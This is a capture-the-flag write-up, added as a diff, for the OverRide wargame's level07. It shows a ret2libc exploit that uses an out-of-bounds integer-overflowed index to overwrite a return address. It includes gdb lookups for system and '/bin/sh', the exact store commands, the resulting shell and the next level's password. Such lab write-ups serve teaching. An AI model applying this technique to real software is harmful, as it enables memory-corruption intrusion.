@@ -1,0 +1,60 @@
+The program is a number storage, it prompts the user for a command, either "store", "read" or "quit".
+The quit command is self explanatory, the store command reads an index and a number, and store that number in a buffer at the given index, the read command reads the buffer at a given index.
+
+We can exploit the lack of bound checks in `store_number` to rewrite the function's return address with a ret2libc.
+
+We simply have to find the offset between the buffer in which the number is stored and the function's eip.
+With gdb, we find that it is equal to 456, eip is set to 0xffffd6cc when we enter the function `read_number`, our buffer's address is 0xffffd504.
+Since we're dealing with an buffer of integer, the index is multiplied by sizeof(int) = 4.
+This means we want to access buffer + 456/4, so an offset of 114.
+
+The code does checks to prevent the index to be a multiple of 3, we need a way to bypass this.
+Since the index is an integer, it will be multiplied by 4, we just have to overflow so that it loops back to 114.
+
+Using the following formula gives us 4 potential candidates within INT_MAX range:
+> x * (2 ^ 32 / 4) + 114
+- 114
+- 1073741938
+- 2147483762
+- 3221225586
+
+We are going to use a ret2libc exploit, we need to write at eip and eip+2, so we need an index which, when divided by 3, gives 2. This is required so that (index + 2) % 3 equals 1.
+
+The only acceptable candidate is 2147483762.
+We now have our valid index to override eip, we'll want to find the parts to build our ret2libc exploit: The address of the function `system` and an address of the literal string "/bin/sh".
+
+(gdb) p system
+$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
+(gdb) find __libc_start_main,+99999999,"/bin/sh"
+0xf7f897ec
+
+We found 0xf7e6aed0 for system and 0xf7f897ec for the string, in decimal this gives us 4159090384 and 4160264172.
+
+We can now run our exploit by first storing the address of `system` into buffer + 2147483762, then storing the address of our string literal in buffer + 2147483762 + 2.
+
+level07@OverRide:~$ ./level07
+----------------------------------------------------
+  Welcome to wil's crappy number storage service!
+----------------------------------------------------
+ Commands:
+    store - store a number into the data storage
+    read  - read a number from the data storage
+    quit  - exit the program
+----------------------------------------------------
+   wil has reserved some storage :>
+----------------------------------------------------
+
+Input command: store
+ Number: 4159090384
+ Index: 2147483762
+ Completed store command successfully
+Input command: store
+ Number: 4160264172
+ Index: 2147483764
+ Completed store command successfully
+Input command: quit
+$ whoami
+level08
+$ cd ../level08
+$ cat .pass
+7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
